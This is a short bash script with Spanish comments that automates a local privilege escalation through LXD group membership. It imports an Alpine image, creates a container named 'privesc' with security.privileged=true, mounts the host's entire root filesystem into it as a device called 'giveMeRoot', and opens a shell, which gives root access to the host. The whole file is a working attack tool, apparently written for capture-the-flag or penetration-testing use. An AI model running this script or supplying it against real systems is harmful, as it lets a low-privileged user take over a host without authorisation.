#!/bin/bash

#Imagen de prueba: wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
#la Raiz se monta en /mnt/root/


trap ctrl_c INT
function ctrl_c(){
	tput cnorm;
	exit 0
}
function helpPanel(){
echo "Uso:"
echo -e '\t[-f] Archivo'
exit 1
}
function cleanup(){
	lxc stop privesc && lxc delete privesc && lxc image delete alpine
	tput cnorm
}
function createContainer(){
	lxc image import $filename --alias alpine && lxd init --auto
	echo -e "\n [*] Listando Images...\n" && lxc image list
	lxc init alpine privesc -c security.privileged=true
	lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
	lxc start privesc 
	lxc exec privesc sh
	cleanup
}
declare -i parameter_enable=0; while getopts ":f:h:" arg; do
	case $arg in
		f) filename=$OPTARG && let parameter_enable+=1;;
		h) helpPanel;;
	esac
done

if [ $parameter_enable -ne 1 ]; then
		helpPanel
else
	tput civis 
	createContainer
fi
